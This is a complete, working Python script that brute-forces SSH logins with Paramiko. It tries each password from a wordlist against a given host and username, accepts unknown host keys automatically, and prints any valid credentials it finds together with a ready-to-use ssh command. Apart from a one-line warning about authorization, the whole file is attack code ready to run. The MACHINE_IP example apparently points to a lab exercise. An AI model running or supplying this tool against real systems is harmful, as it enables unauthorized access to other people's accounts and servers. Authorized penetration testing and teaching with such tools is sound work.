
#!/usr/bin/env python3
"""
SSH Brute Force Tool
Automates SSH credential testing by iterating through a wordlist
of passwords against a target host and username. Uses Paramiko
for SSHv2 communication.

WARNING: Only use against systems you own or have explicit written
authorization to test. Unauthorized access is illegal.
"""

import paramiko  # Third-party library for SSH connections
import sys       # For command-line arguments

def try_credential(target, username, password, port=22):
    """Attempt SSH login with the given credentials. Return True on success."""
    # Initialize the SSH client
    ssh = paramiko.SSHClient()
    
    # Automatically accept and store unknown host keys (avoids fingerprint prompt)
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        # Attempt the SSH connection (timeout after 5 seconds)
        ssh.connect(target, port=port, username=username, password=password, timeout=5)
        ssh.close()
        return True  # Login successful
        
    except paramiko.AuthenticationException:
        # Wrong password: fail silently so the loop can try the next one
        return False
        
    except (paramiko.SSHException, OSError) as e:
        # Network error or connection dropped: print warning and continue
        print(f"[!] Connection error: {e}")
        return False

def brute_force_ssh(target, username, wordlist_path, port=22):
    """Try each password in the wordlist against the target SSH server."""
    try:
        # Read the wordlist into memory, stripping newlines and skipping blanks
        with open(wordlist_path, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Wordlist not found: {wordlist_path}")
        return None

    print(f"[*] Loaded {len(passwords)} password(s) from {wordlist_path}")
    print(f"[*] Target: {target}:{port}")
    print(f"[*] Username: {username}\n")

    # Iterate through every password, tracking the attempt number
    for attempt, password in enumerate(passwords, start=1):
        print(f"[*] Attempt {attempt}/{len(passwords)}: {password}")

        # If the login succeeds, stop the loop and return the password
        if try_credential(target, username, password, port):
            print(f"\n[+] Password found: {password}")
            return password

    print(f"\n[-] Exhausted wordlist. No valid password found.")
    return None

def main():
    # Ensure the user provided at least target, username, and wordlist
    if len(sys.argv) < 4:
        print(f"Usage: python3 {sys.argv[0]} <target> <username> <wordlist> [port]")
        print(f"Example: python3 {sys.argv[0]} MACHINE_IP admin passwords.txt 22")
        sys.exit(1)

    # Parse command-line arguments
    target = sys.argv[1]
    username = sys.argv[2]
    wordlist_path = sys.argv[3]
    # Use a fourth argument for port if provided, otherwise default to 22
    port = int(sys.argv[4]) if len(sys.argv) > 4 else 22

    # Run the brute force attack
    result = brute_force_ssh(target, username, wordlist_path, port)

    # Print the final result and a helpful SSH command
    if result:
        print(f"\n[*] Valid credentials: {username}:{result}")
        print(f"[*] Connect with: ssh {username}@{target}")
    else:
        print(f"\n[*] Try a larger wordlist or a different username.")

# Entry point
main()